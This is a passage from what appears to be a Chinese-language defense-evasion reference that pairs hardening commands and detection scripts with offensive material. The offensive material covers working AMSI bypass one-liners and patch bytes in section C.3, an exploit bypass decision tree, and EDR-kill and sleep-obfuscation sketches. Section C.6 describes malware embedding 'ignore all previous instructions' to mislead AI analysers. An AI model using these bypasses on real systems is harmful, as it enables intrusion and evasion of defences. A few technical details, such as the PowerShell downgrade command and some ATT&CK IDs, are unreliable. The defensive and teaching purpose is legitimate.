    "anti_debug": [
        r"IsDebuggerPresent|CheckRemoteDebugger",
        r"NtQueryInformationProcess|ZwQuery",
        r"rdtsc|__asm.*int\s+3",
        r"TLS_CALLBACK|IMAGE_TLS_DIRECTORY",
    ],
}

def analyze_file(filepath):
    results = {}
    try:
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        return {"error": str(e)}

    for category, patterns in SANDBOX_INDICATORS.items():
        matches = []
        for pattern in patterns:
            found = re.findall(pattern, content, re.IGNORECASE)
            matches.extend(found)
        if matches:
            results[category] = list(set(matches))

    return results

if __name__ == "__main__":
    results = analyze_file(sys.argv[1])
    print(json.dumps(results, indent=2))
    if results:
        print(f"\n[!] Total evasion categories detected: {len(results)}")
    else:
        print("[+] No evasion indicators found")
```

#### 5.4 常数时间侧信道检测

```python
#!/usr/bin/env python3
"""
常数时间分析 — 检测密码学实现中的时序泄露
适用于验证密码比较、密钥操作是否常数时间
"""
import time, statistics

def measure_comparison(func, correct_val, test_inputs, iterations=10000):
    """测量比较函数的执行时间分布"""
    timings = {}

    for inp in test_inputs:
        times = []
        for _ in range(iterations):
            t0 = time.perf_counter_ns()
            func(inp, correct_val)
            t1 = time.perf_counter_ns()
            times.append(t1 - t0)

        timings[inp] = {
            "mean": statistics.mean(times),
            "stdev": statistics.stdev(times) if len(times) > 1 else 0,
            "median": statistics.median(times),
        }
    return timings

def check_constant_time(timings, threshold_ratio=0.15):
    """
    检查是否常数时间
    如果最慢和最快的均值差异超过 threshold_ratio，则可能泄露
    """
    means = [v["mean"] for v in timings.values()]
    min_mean = min(means)
    max_mean = max(means)

    if min_mean == 0:
        return True, 0.0

    ratio = (max_mean - min_mean) / min_mean
    is_constant = ratio < threshold_ratio

    return is_constant, ratio

# === 不安全示例：逐字符比较（短路退出） ===
def insecure_compare(a, b):
    if len(a) != len(b):
        return False
    for i in range(len(a)):
        if a[i] != b[i]:
            return False  # 短路 — 时间取决于匹配前缀长度
    return True

# === 安全实现：常数时间比较 ===
def secure_compare(a, b):
    if len(a) != len(b):
        return False
    result = 0
    for i in range(len(a)):
        result |= ord(a[i]) ^ ord(b[i])
    return result == 0

# === 测试 ===
if __name__ == "__main__":
    secret = "supersecret123"
    tests = [
        "supersecret123",   # 完全匹配
        "supersecret124",   # 末尾不同
        "supersecret",      # 前缀匹配
        "XXXXXXXXXXXXXX",   # 完全不同
    ]

    print("=== Insecure comparison ===")
    timings = measure_comparison(insecure_compare, secret, tests, 100000)
    is_ct, ratio = check_constant_time(timings)
    for inp, stats in timings.items():
        print(f"  {inp:20s} mean={stats['mean']:.0f}ns stdev={stats['stdev']:.0f}ns")
    print(f"  Constant time: {is_ct} (variance ratio: {ratio:.2%})")

    print("\n=== Secure comparison ===")
    timings = measure_comparison(secure_compare, secret, tests, 100000)
    is_ct, ratio = check_constant_time(timings)
    for inp, stats in timings.items():
        print(f"  {inp:20s} mean={stats['mean']:.0f}ns stdev={stats['stdev']:.0f}ns")
    print(f"  Constant time: {is_ct} (variance ratio: {ratio:.2%})")
```

### 6. 修复方案

#### 6.1 Windows 安全加固

```powershell
# === Windows Defender/EDR 加固 ===

# 1. 启用受控文件夹访问（防勒索/篡改）
Set-MpPreference -EnableControlledFolderAccess Enabled

# 2. 启用 AMSI 保护（确保未被修补）
# 定期检查 AMSI 完整性
$a = [AMSI]::InitFailed
if ($a) { Write-Warning "AMSI may be compromised!" }

# 3. 配置 Defender 排除项审计
# 检查异常排除（攻击者可能添加排除路径）
Get-MpPreference | Select-Object -Property Exclusion*

# 4. 启用 ASR 规则（攻击面减少）
# 阻止可疑行为
Set-MpPreference -AttackSurfaceReductionRules_Ids `
  "75668C1F-73B5-4CF0-BB93-3ECF5B74584F", `  # 阻止 Office 注入
  "3B576869-A4EC-4529-8536-B80A7769E899", `   # 阻止 Office 创建可执行文件
  "D1E49AAC-8F56-4280-B9BA-993A6D77406C", `   # 阻止 LOLBin 执行
  "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550"      # 阻止可疑进程创建
Set-MpPreference -AttackSurfaceReductionRules_Actions "Enabled","Enabled","Enabled","Enabled"

# 5. ETW 监控增强
# 确保关键 ETW 提供者已启用
logman query providers | findstr -i "Microsoft-Antimalware"
logman query providers | findstr -i "Microsoft-Windows-PowerShell"

# 6. 启用 Credential Guard（防凭证获取）
# 需要重启
# 通过 GPO: Computer Configuration > Administrative Templates > System > Device Guard
# Turn on Virtualization Based Security: Enabled with UEFI Lock
```

#### 6.2 macOS 安全加固

```bash
# === macOS 安全加固 ===

# 1. 确保 SIP 启用
csrutil status
# 如果已关闭：重启到 Recovery Mode → csrutil enable

# 2. Gatekeeper 强制
spctl --master-enable
# 禁止绕过 Gatekeeper
defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool true

# 3. 启用防火墙
/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
/usr/libexec/ApplicationFirewall/socketfilterfw --setblockall on
/usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on

# 4. 限制 DYLD 注入
# 启用 Hardened Runtime（开发者视角）
# 在 Xcode 中: Signing & Capabilities > Hardened Runtime

# 5. 强化 TCC 权限
# 定期审计 TCC 数据库
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value FROM access WHERE allowed = 0;" 2>/dev/null

# 6. 系统完整性监控
# 安装 FileProvider 监控
# 启用 OpenBSM 审计
sudo audit -i
sudo audit -n  # 查看审计事件
```

#### 6.3 Linux 安全加固

```bash
# === Linux 安全加固 ===

# 1. SELinux 强制模式
sudo setenforce 1
sudo sed -i 's/SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config

# 2. AppArmor 配置
sudo aa-enforce /etc/apparmor.d/*
sudo systemctl enable apparmor

# 3. 内核硬化参数
cat >> /etc/sysctl.d/99-security.conf << 'EOF'
# 禁止未授权的 ptrace（防进程注入）
kernel.yama.ptrace_scope = 2
# 启用 ASLR（随机化所有地址空间）
kernel.randomize_va_space = 2
# 禁止核心转储给非特权用户
fs.suid_dumpable = 0
# 限制 dmesg
kernel.dmesg_restrict = 1
# 限制 /proc 访问
kernel.kptr_restrict = 2
EOF
sudo sysctl -p /etc/sysctl.d/99-security.conf

# 4. 二进制保护编译选项
# 编译时启用所有保护:
# gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie \
#     -Wl,-z,relro,-z,now -fno-omit-frame-pointer

# 5. 审计规则增强
cat >> /etc/audit/rules.d/audit.rules << 'EOF'
# 监控执行
-a always,exit -F arch=b64 -S execve -k command_exec
# 监控注入
-a always,exit -F arch=b64 -S ptrace -k process_inject
# 监控网络
-a always,exit -F arch=b64 -S connect -k network_connect
EOF
sudo augenrules --load
```

#### 6.4 IPv6 安全加固

```bash
# === IPv6 安全加固 ===

# 1. 禁止未经授权的 RA（路由器通告）
# Linux: 使用 RA Guard
ip6tables -A INPUT -p icmpv6 --icmpv6-type router-advertisement -j DROP
# 或在交换机层面启用 RA Guard

# 2. NDP 欺骗防护
# 启用 NDP Inspection
ip -6 neigh add fe80::1 lladdr 00:11:22:33:44:55 dev eth0 nud permanent

# 3. 限制 IPv6 扩展头
ip6tables -A INPUT -m ipv6header --header hop-by-hop -j DROP
ip6tables -A INPUT -m ipv6header --header routing -j DROP

# 4. 如果不需要 IPv6，完全禁用
sysctl -w net.ipv6.conf.all.disable_ipv6=1
sysctl -w net.ipv6.conf.default.disable_ipv6=1

# 5. IPv6 防火墙基础规则
ip6tables -P INPUT DROP
ip6tables -P FORWARD DROP
ip6tables -A INPUT -i lo -j ACCEPT
ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
ip6tables -A INPUT -p icmpv6 -j ACCEPT  # ICMPv6 是 IPv6 必需的
ip6tables -A INPUT -p tcp --dport 22 -j ACCEPT
```

---

## 速查表

### 规避技术矩阵（按平台）

| 技术 | Windows | macOS | Linux | 检测难度 | 缓解措施 |
|------|---------|-------|-------|----------|----------|
| AMSI 修补 | Y | - | - | 高 | ETW 监控 + 完整性检查 |
| ETW 修补 | Y | - | - | 高 | 内核回调 + 独立 ETW + NDR |
| 直接系统调用 | Y | - | - | 中 | 内核回调 + ETWTI |
| 间接系统调用(SysWhispers4) | Y | - | - | 高 | 调用栈完整性验证 + ETWTI |
| DLL 侧加载 | Y | - | Y | 中 | 代码签名 + 路径白名单 |
| 进程注入 | Y | Y | Y | 中 | EDR 内存监控 |
| DYLD 注入 | - | Y | - | 低 | Hardened Runtime |
| TCC 绕过 | - | Y | - | 中 | TCC 审计 + SIP + Entitlement验证 |
| SELinux 绕过 | - | - | Y | 高 | 强制模式 + 最小权限 |
| 反沙箱检查 | Y | Y | Y | 低 | 增强沙箱 + 行为分析 |
| LOLBin 滥用 | Y | - | - | 中 | ASR 规则 + 监控 |
| 二进制加壳 | Y | Y | Y | 低 | 入口点熵分析 |
| ROP/ROPchain | Y | Y | Y | 高 | CET + PAC |
| IPv6 NDP 欺骗 | Y | Y | Y | 中 | RA Guard + NDP 检测 |
| 侧信道泄露 | Y | Y | Y | 极高 | 常数时间实现 |
| Sleep Obfuscation | Y | - | - | 极高 | 内存扫描频率提升 + VirtualProtect监控 |
| Hardware BP AMSI绕过 | Y | - | - | 极高 | 调试寄存器异常监控 |
| Call Stack Spoofing | Y | - | - | 极高 | 调用栈完整性验证 |
| BYOVD/EDR Kill | Y | - | - | 极高 | HVCI + Driver Blocklist |
| AI/LLM辅助规避 | Y | Y | Y | 极高 | 高熵分析 + LLM API调用检测 |

### 反混淆工具参考

| 工具 | 目标语言 | 用途 | 安装 |
|------|----------|------|------|
| Invoke-Obfuscation | PowerShell | 混淆 | `Install-Module Invoke-Obfuscation` |
| Revoke-Obfuscation | PowerShell | 检测混淆 | `Install-Module Revoke-Obfuscation` |
| PSDecode | PowerShell | 反混淆 | `pip install psdecode` |
| javascript-obfuscator | JavaScript | 混淆 | `npm i -g javascript-obfuscator` |
| js-deobfuscator | JavaScript | 反混淆 | `npm i -g js-deobfuscator` |
| JSDetox | JavaScript | 反混淆沙箱 | 在线/Docker |
| OLLVM | C/C++ | 编译时混淆 | 源码编译 |
| UPX | Binary | 壳/压缩 | `apt install upx` |
| ROPgadget | Binary | ROP gadget 查找 | `pip install ropgadget` |
| pwntools | Binary | 漏洞利用框架 | `pip install pwntools` |
| checksec | Binary | 保护检查 | `pip install pwntools` |

### 二进制保护绕过决策树

```
目标二进制保护状态:
├─ NX/DEP 启用?
│  ├─ 否 → 直接栈 shellcode
│  └─ 是 → ret2libc / ROP chain
│     ├─ 有 system()? → ret2system
│     └─ 无 system() → ret2execve syscall
├─ ASLR 启用?
│  ├─ 否 → 直接硬编码地址
│  └─ 是 → 信息泄露 + 偏移计算
│     ├─ 格式化字符串? → 泄露 libc base
│     ├─ 越界读? → 泄露 GOT 表
│     └─ fork 服务器? → 逐字节爆破
├─ Stack Canary?
│  ├─ 否 → 直接覆盖返回地址
│  └─ 是 → 泄露 or 绕过
│     ├─ 格式化字符串? → 泄露 canary
│     ├─ fork 服务器? → 逐字节爆破
│     └─ 无 Full RELRO? → 覆盖 __stack_chk_fail@GOT
└─ PIE 启用?
   ├─ 否 → PLT/GOT 地址固定可用
   └─ 是 → 先泄露 binary base
      └─ partial overwrite (低 12 位不变)
```

### 常见反沙箱检查目录

| 检查类型 | 指标 | 绕过方法 |
|----------|------|----------|
| 文件系统 | VMware Tools、VBoxGuestAdditions | 增强沙箱移除特征 |
| 注册表 | HKLM\SOFTWARE\VMware Inc、VBOX | 沙箱清除注册表键 |
| MAC 地址 | 00:0C:29, 08:00:27, 0A:00:27 | 沙箱使用合法 MAC |
| CPU/内存 | <=2 核、<4GB RAM | 分配更多资源 |
| 用户活动 | 长时间空闲、无浏览器历史 | 模拟用户行为 |
| 时间加速 | Sleep 不准确 | 使用精确时间模拟 |
| 进程数量 | <50 个进程 | 运行更多后台进程 |
| 网络特征 | 无真实 DNS、无 Internet | 提供真实网络环境 |
| 硬件 | 无 USB 设备、小磁盘 | 虚拟真实硬件配置 |

---

## MITRE ATT&CK 映射

| Technique | ID | 攻击场景 | 检测/防御 |
|-----------|-----|----------|-----------|
| Impair Defenses | T1562 | AMSI/ETW 修补、禁用 AV | 完整性监控、ETW 回调 |
| Indicator Removal | T1070 | 清除日志、时间戳操纵 | 集中式日志、FIM |
| Obfuscated Files | T1027 | 代码混淆、加壳 | 反混淆管道、熵分析 |
| Masquerading | T1036 | LOLBin 滥用、文件伪装 | ASR 规则、路径监控 |
| Process Injection | T1055 | DLL 注入、进程空心化 | EDR 内存监控 |
| Virtualization/Sandbox Evasion | T1497 | 反沙箱检查 | 增强沙箱、行为分析 |
| Debugger Evasion | T1627 | 反调试技术 | 反反调试插件 |
| Binary Padding | T1027.001 | 填充绕过签名检测 | 多维度检测 |
| Exploitation for Client Execution | T1203 | 二进制漏洞利用 | DEP/ASLR/CET/PAC |
| Lateral Tool Transfer | T1570 | IPv6 隧道传输 | IPv6 监控、RA Guard |
| Protocol Tunneling | T1572 | IPv6 封装规避 | 深度包检测 |
| Hide Infrastructure | T1090 | 通过 IPv6 隐藏 C2 | 流量基线分析 |
| Subvert Trust Controls | T1553 | 代码签名伪造 | 签名验证加固 |
| EXCLUSIVE to adversary | T1106 | 直接/间接系统调用 | 内核回调 + ETWTI + 调用栈验证 |
| Sleep Obfuscation | T1027.009 | Ekko→Foliage→Moonwalk++ 加密休眠 | 内存扫描频率 + VirtualProtect监控 |
| EDR Kill via BYOVD | T1562.001 | 脆弱驱动加载杀EDR | HVCI + Driver Blocklist |
| AI-Assisted Evasion | T1027.014 | LLM生成混淆/规避代码 | 高熵分析 + LLM API调用检测 |
| Hardware Breakpoint Bypass | T1562.001 | DR0-DR7拦截AMSI无内存写入 | 调试寄存器异常监控 |
| Call Stack Spoofing | T1055.012 | Moonwalk++伪造调用栈欺骗EDR | 调用栈完整性验证 |

---

## 前置条件清单

- [ ] 目标平台安全产品识别完成（AV/EDR/SIP/SELinux）
- [ ] 沙箱/虚拟环境检测脚本已部署和测试
- [ ] AMSI 绕过技术验证（仅在授权测试中）
- [ ] 反混淆工具链安装就绪（PSDecode、JSDetox、ROPgadget）
- [ ] 二进制保护检查工具（checksec、pwntools）
- [ ] 常数时间分析脚本就绪（用于密码学审计）
- [ ] IPv6 防火墙规则和 RA Guard 配置验证
- [ ] 检测规则部署（Sigma/YARA/Sysmon）
- [ ] 平台安全加固措施已实施
- [ ] 事件响应流程包含规避技术检测预案

---

## Part C：2025-2026 前沿补充

### C.1 Indirect Syscalls 演进与 SysWhispers4

Indirect Syscalls 已从 Hell's Gate 单一技术发展为多代工具链，SysWhispers4（2025）代表当前最全面实现。

**SysWhispers4 技术矩阵（GitHub: JoasASantos/SysWhispers4）：**

| 维度 | 选项 | 说明 |
|------|------|------|
| **SSN 解析（8种）** | FreshyCalls、SyscallsFromDisk、RecycledGate、HW Breakpoint（SW4新增4种）、Hell's Gate、Tartarus' Gate | 从内存/磁盘/hardware breakpoint多源解析系统调用号 |
| **调用方式（4种）** | Indirect（ntdll内syscall指令）、Direct（自定义syscall）、Callback-based、HW Breakpoint-based | 不同调用路径对抗不同EDR hook策略 |
| **代码多样性** | 14种junk instruction变体、CRC32/FNV-1a哈希替代 | 每次生成不同的stub代码 |
| **覆盖范围** | 64个NT函数、8个预设 | 覆盖常见内存/进程/线程操作 |
| **内置功能** | AMSI绕过、ntdll unhooking、反调试、sleep加密 | 一体化规避框架 |

```
// SysWhispers4 生成示例（间接syscall NtAllocateVirtualMemory）
// 特征：syscall指令位于ntdll合法区域内，调用栈看起来来自ntdll
mov r10, rcx
mov eax, SSN_NtAllocateVirtualMemory  ; 运行时解析
jmp [address_in_ntdll]                ; 跳转到ntdll中的syscall指令
; 而非直接 syscall（可被ETWTI检测到）
```

**间接syscall vs 直接syscall 检测对比：**

| 检测方法 | Direct Syscall | Indirect Syscall |
|----------|---------------|-----------------|
| ETWTI（内核回调） | 可检测（calltrace含unbacked） | 难检测（calltrace显示ntdll） |
| 用户态hook | 绕过 | 绕过 |
| 调用栈分析 | 异常（syscall不在ntdll） | 正常（syscall在ntdll） |
| Static analysis | syscall指令在.text段外 | syscall指令在ntdll范围内 |

### C.2 Sleep Obfuscation 完整演进链

Sleep Obfuscation 是2024-2026规避领域最重要的技术演进之一，解决了beacon在sleep期间被内存扫描发现的问题。

**演进链：Ekko → Cronos → Zilean → DeathSleep → Foliage**

```
┌─────────────────────────────────────────────────────────┐
│ Sleep Obfuscation 演进时间线                              │
├──────────┬──────────┬──────────┬──────────┬─────────────┤
│ Ekko     │ Cronos   │ Zilean   │DeathSleep│ Foliage     │
│ (2022)   │ (2024)   │ (2024)   │ (2024)   │ (2025)      │
├──────────┼──────────┼──────────┼──────────┼─────────────┤
│ ROP链    │ 改进ROP  │ APC-based│Timer APC │ APC + Stack │
│ 加密sleep│ 加密sleep│ 加密sleep│ 加密sleep│ Duplication │
│          │          │          │          │ + RC4加密    │
└──────────┴──────────┴──────────┴──────────┴─────────────┘
```

**Foliage（2025，oblivion-malware.xyz）：**

```c
// Foliage 核心流程（APC-based + Stack Duplication）
// 1. VirtualProtect(RX → RW) 准备加密
// 2. SystemFunction040(RC4加密shellcode)
// 3. NtCreateEvent + WaitForSingleObjectEx(sleep)
// 4. APC回调触发：SystemFunction041(RC4解密)
// 5. VirtualProtect(RW → RX) 恢复执行权限
// 6. Stack Duplication: NtGetContextThread + NtSetContextThread
//    复制线程上下文，隐藏beacon真实调用栈

// 关键创新：使用 SystemFunction040/041（advapi32内置RC4）
// 而非自定义AES，避免高熵加密库被检测
```

**Moonwalk++（klezvirus, Black Hat Europe 2025）：**

```c
// Moonwalk++ = Call Stack Spoofing + Sleep Encryption 同时进行
// 突破 Elastic Eclipse 检测算法
// 自定义 ROP chain 放置在隐藏的栈区域中执行加密/解密
// 检测情况：
//   - Hunt-Sleeping-Beacons: 失败
//   - Elastic Eclipse: 失败
//   - DelayExecution: 失败
//   - hollows_hunter -scan-unreachable: 可检测加密shellcode模式
```

**检测方案：**

```python
# Sleep Obfuscation 检测脚本
# 基于 VirtualProtect → NtTestAlert 调用链（Elastic EDR规则）
# 以及 moneta 栈分析

def detect_sleep_obfuscation(sysmon_events):
    """检测 sleep obfuscation 行为特征"""
    indicators = []
    for event in sysmon_events:
        # 特征1: 短时间内 RX→RW→RX 权限循环
        if event['EventID'] == 10:  # ProcessAccess
            if 'VirtualProtect' in event.get('CallTrace', ''):
                # 检查是否有 RW→RX 的快速切换
                pass
        # 特征2: SystemFunction040/041 调用（加密API）
        if event.get('TargetFilename', '').endswith(('advapi32.dll',)):
            pass
        # 特征3: NtCreateEvent + WaitForSingleObjectEx 组合
        # 特征4: 线程上下文频繁修改（Stack Duplication特征）
    return indicators
```

### C.3 AMSI 绕过 2025-2026 更新（7种方法）

基于 RadiantSec 2026年3月综合测试（Windows 11 23H2, Dec 2025）：

```powershell
# === AMSI 绕过方法 7 种（2025-2026 实测有效） ===

# ── 方法1: Reflection（反射修改 amsiInitFailed）──
# 混淆变体：环境变量走私、char数组、字符串分割
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 检测风险：低（如果代码经过混淆）

# ── 方法2: Byte Patch（AmsiScanBuffer内存修补）──
# 修改函数prologue为: mov eax, 0x80070057; ret
$patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
# 检测风险：中（VirtualProtect可被监控）

# ── 方法3: Context Corruption（HAMSICONTEXT清零）──
# 不修改代码内存，而是清零AMSI上下文句柄
$ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
  .GetField('amsiContext','NonPublic,Static').GetValue($null)
[Runtime.InteropServices.Marshal]::Copy(
  [byte[]]::new([IntPtr]::Size), 0, $ctx, [IntPtr]::Size)
# 检测风险：低（无内存写入）

# ── 方法4: ETW Patch（禁用遥测）──
# 修补 ntdll.dll 中的 EtwEventWrite 为 ret
# 与 AMSI 绕过配合使用，消除双重检测
# 检测风险：中

# ── 方法5: Hardware Breakpoint（硬件断点拦截）──
# 使用CPU调试寄存器 DR0-DR7 + VEH 异常处理
# 拦截 AmsiScanBuffer 调用，无需任何内存写入
# CrowdStrike 文档记载；极少数EDR监控调试寄存器
# 检测风险：极低（无内存修改）
# 来源: https://radiantsec.io/docs/redteam/bypass-amsi

# ── 方法6: .NET 进程内绕过（三种子方法组合）──
# 字节修补 + 反射 + 上下文清零，从托管代码执行
# 检测风险：可变

# ── 方法7: PowerShell 降级 ──
# 降级到 PowerShell 2.0（早于 AMSI 引入）
# 注意：Win11 已移除 PS2.0
pwsh -version 2
# 检测风险：低（但 Win11 不可用）
```

### C.4 BYOVD/EDR Kill 时间线（2023-2026）

攻击者通过加载合法签名驱动（Bring Your Own Vulnerable Driver）直接在内核层杀死EDR进程。

```
┌──────────────────────────────────────────────────────────────┐
│ BYOVD 攻击时间线 2023-2026                                    │
├──────────┬──────────────────────┬────────────────────────────┤
│ 时间     │ 组织                 │ 使用的脆弱驱动              │
├──────────┼──────────────────────┼────────────────────────────┤
│ 2023 Q1  │ AvosLocker           │ aswArPot.sys               │
│ 2023 Q1  │ AuKill (3起勒索)     │ PROCEXP.SYS                │
│ 2023     │ BlackByte            │ RTCore64.sys (CVE-2019-16098)│
│ 2024-2025│ RansomHub            │ TrueSight.sys v2.0.2       │
│          │ EDRKillShifter       │ 2500+变体，75%受害者在中国   │
│          │                      │ 扩散到Play/BianLian/Medusa  │
│ 2025 Q1  │ ToddyCat APT         │ ESET ecls.exe DLL劫持      │
│          │                      │ (CVE-2024-11859)           │
│ 2025     │ LockBit              │ MpCmdRun.exe + MpClient.dll │
│          │                      │ 侧加载                     │
│ 2026 Q2  │ Huntress事件         │ 驱动滥用使数十个终端防护     │
│          │                      │ 工具失效                    │
└──────────┴──────────────────────┴────────────────────────────┘
```

**EDR Kill 技术矩阵（windshock.github.io + Arms Cyber 2026）：**

| 技术 | 原理 | 检测难度 | 防御 |
|------|------|----------|------|
| **BYOVD** | 加载合法签名驱动→内核杀EDR进程 | 极高 | Vulnerable Driver Blocklist + HVCI |
| **BYOI** | 运行EDR自身安装程序卸载EDR | 高 | 安装卸载需要额外认证 |
| **DLL Hijacking** | 劫持安全产品的DLL搜索顺序 | 中 | 代码签名+路径白名单 |
| **内存规避** | Shellcode在活跃/休眠间切换，RWX仅短暂存在 | 高 | 内存扫描频率提升 |
| **Call Stack Spoofing** | 伪造调用栈欺骗EDR（Moonwalk++） | 极高 | 调用栈完整性验证 |
| **ETW Session Kill** | 枚举EDR的ETW会话并关闭 | 高 | NDR补充监控 |
| **SilentButDeadly** | 阻断EDR/AV网络通信，切断云端遥测 | 高 | 本地日志+离线检测 |

**EDRSandblast（ETW TI内核层禁用）：**

```c
// 通过 BYOVD 清除内核内存中的 ETW TI provider flag
// 使 EDR 的 ETW 遥测完全失效
// 已在多个生产环境EDR产品上验证有效
// 来源: Arms Cyber 2026
```

### C.5 2025-2026 关键CVE速查

#### Windows 安全特性绕过

| CVE | 描述 | 影响 | CVSS | 日期 |
|-----|------|------|------|------|
| **CVE-2026-33825** (BlueHammer/RedSun/UnDefend) | Windows Defender TOCTOU竞态（签名更新工作流）+ 路径混淆；本地低权限→SYSTEM。13天内3个零日（Chaotic Eclipse/Nightmare-Eclipse） | 本地提权至SYSTEM | 严重 | 2026-04 |
| **CVE-2026-26119** | Windows Admin Center远程提权；低权限用户网络提权 | 远程提权 | 高 | 2025-12 |
| **CVE-2025-62215** | Windows内核(ntoskrnl.exe)竞态条件；EDB-ID 52494 PoC已公开 | 本地提权至SYSTEM | 高 | 2025-11 |
| **CVE-2024-11859** | ESET命令行扫描器DLL搜索顺序劫持；ToddyCat APT利用部署恶意DLL | 安全产品DLL劫持 | 高 | 2025-01 |

#### macOS TCC/SIP 绕过

| CVE | 描述 | 影响 | CVSS | 日期 |
|-----|------|------|------|------|
| **CVE-2025-43530** | TCC绕过via VoiceOver(com.apple.scrod)；注入Apple签名二进制；利用AppleEvent派遣至Finder/摄像头/麦克风。公开PoC在GitHub。macOS 26.2以entitlement验证修复 | 完整TCC绕过（Full Disk Access/摄像头/麦克风） | 高 | 2026-01 |
| **CVE-2024-44243** | SIP绕过via entitlement滥用；root级攻击者绕过SIP。继CVE-2021-30892(Shrootless)和CVE-2023-32369(Migraine)后第三个SIP绕过 | SIP绕过 | 高 | 2025-01 |

#### Linux 内核保护绕过

| CVE/名称 | 描述 | 影响 | CVSS | 日期 |
|----------|------|------|------|------|
| **CrackArmor**（9个CVE） | Qualys TRU发现AppArmor confused deputy漏洞；非特权用户绕过内核MAC | 容器隔离绕过/AppArmor绕过 | 高 | 2026-03 |
| **CVE-2025-1272** | Secure Boot在Linux 6.12+不自动启用kernel lockdown（Fedora） | Secure Boot绕过 | 中 | 2025 |
| **CVE-2026-20182** | Linux algif_aead模块9年逻辑bug(AF_ALG加密子系统)；732字节Python脚本本地提权root。已加入CISA KEV（3天期限） | 本地root提权 | 严重 | 2025 |
| **CVE-2025-21800** | eBPF漏洞实现完整容器逃逸，pod安全策略失效 | 容器逃逸 | 高 | 2025 |

### C.6 AI/LLM 辅助规避技术

**Check Point "Skynet" 恶意软件研究（2025年6月）：**

```
// AI规避恶意软件原型（Check Point Research）
// 核心思路：嵌入 "ignore all previous instructions" 规避AI恶意软件分析
// 
// 技术栈：
//   - XOR + Base64 字符串混淆
//   - 沙箱规避测试套件：
//     * CPUID虚拟机检测
//     * BIOS vendor检查
//     * 磁盘枚举
//     * 环境变量检查
//     * MAC前缀匹配
//     * 进程名黑名单
//   - 不透明谓词（opaque predicates）
//   - 内嵌TOR客户端
//
// 结果：对 OpenAI o3 和 gpt-4.1 攻击失败
// 新兴攻击面：ida-pro-mcp、aidapal、goose client（LLM辅助逆向工具）
// 来源: https://research.checkpoint.com/2025/ai-evasion-prompt-injection/
```

**LLM嵌入式恶意软件分类（Techmaniacs 2025）：**

| 类型 | 描述 | 检测指标 |
|------|------|----------|
| **本地捆绑蒸馏模型** | 恶意软件内嵌小型LLM，动态生成命令/自混淆 | 高熵值+LLM模型文件特征 |
| **外部LLM API调用** | 通过隐蔽通道调用外部LLM API获取指令 | LLM API调用痕迹+自然语言行为日志 |
| **混合型** | 本地小模型+外部大模型协同 | 上述两者组合 |

```python
# LLM辅助恶意软件检测脚本
def detect_llm_malware(binary_path):
    """检测嵌入LLM的恶意软件特征"""
    indicators = []
    with open(binary_path, 'rb') as f:
        data = f.read()

    # 1. 检测嵌入的模型文件（GGUF/Safetensors/H5格式头）
    model_headers = [
        b'\x47\x47\x55\x46',  # GGUF magic
        b'\x73\x61\x66\x65',  # safetensors
        b'\x89\x48\x44\x46',  # HDF5
    ]
    for header in model_headers:
        if header in data:
            indicators.append(f"Embedded model file detected: {header.hex()}")

    # 2. 检测LLM API端点字符串
    api_patterns = [b'api.openai.com', b'generativelanguage.googleapis.com',
                    b'bedrock-runtime.', b'anthropic.com']
    for pattern in api_patterns:
        if pattern in data:
            indicators.append(f"LLM API endpoint: {pattern.decode()}")

    # 3. 检测高熵区域（AI生成混淆特征）
    import math
    chunk_size = 4096
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        entropy = -sum((chunk.count(b)/len(chunk)) * math.log2(chunk.count(b)/len(chunk))
                       for b in set(chunk) if chunk.count(b) > 0)
        if entropy > 7.5:
            indicators.append(f"High entropy region at offset {hex(i)}: {entropy:.2f}")

    return indicators
```

**CSA研究（2026）：AI辅助勒索软件与EDR规避**
- Cloud Security Alliance发布AI辅助勒索软件和EDR规避研究
- 来源: https://labs.cloudsecurityalliance.org/

### C.7 规避工具生态更新（2025-2026）

| 工具 | 类型 | 关键特性 | 来源 |
|------|------|----------|------|
| **SysWhispers4** | Syscall生成 | 8 SSN解析+4调用方式+内置AMSI/反调试 | GitHub: JoasASantos |
| **ZigStrike** | 载荷投递 | Zig语言开发；Web门户+多注入技术+熵降低+反沙箱；绕过MDE | GitHub: 0xsp-SRD |
| **ScareCrow** | 载荷框架 | DLL侧加载（非注入）到合法进程；从磁盘加载干净ntdll刷新EDR hook | GitHub: Optiv |
| **Moonwalk++** | 调用栈欺骗+Sleep加密 | 同时伪造调用栈和加密sleep；突破Elastic Eclipse | klezvirus (BH Europe 2025) |
| **GoPhantom** | 载荷加载器 | AES-256-GCM加密shellcode+诱饵文件打包为独立EXE | FreeBuf 2025-09 |
| **PuppetMaster** | Linux C2 | 无第三方依赖；绕过Kaspersky EDR+NDR+KATA | FreeBuf 2025-08 |
| **SilentButDeadly** | 网络阻断 | 阻断EDR/AV网络通信，切断云端遥测和威胁情报更新 | FreeBuf 2025-11 |
| **Brute Ratel C4** | 商业C2 | v2.1.2泄露；间接syscall+sleep混淆+APC技术；中国社区教程2026-01 | 商业/泄露 |
| **NimC2** | Nim C2 | Nim 编写跨平台 C2；单二进制、静态链接、易改特征 | GitHub: M4rtis01/NimC2 |
| **Nimhawk C2** | Nim C2 | Nim C2 框架（red-alpha） | GitHub: dmore/Nimhawk-c2-red-alpha |
| **NimDrop** | Nim loader | Nim 写 shellcode 加载/投递 | GitHub: Invadel-Cybersecurity/NimDrop |
| **OffensiveNim** | Nim 工具库 | Nim 红队常用模块库（进程注入/syscall/凭证） | GitHub: byt3bl33d3r/OffensiveNim |
| **nimcrypt** | Nim 加密/打包 | 打包 .NET PE 为 Nim，内置反分析 | GitHub: Chaelsoo/nimcrypt |
| **adhammer** | Rust AD 审计 | Rust 单二进制 AD 审计+RBCD/Shadow Credentials PKINIT 验证 | GitHub: icedracon/adhammer |

**Nim/Rust 武器化对比（2024-2026 生态要点）**：
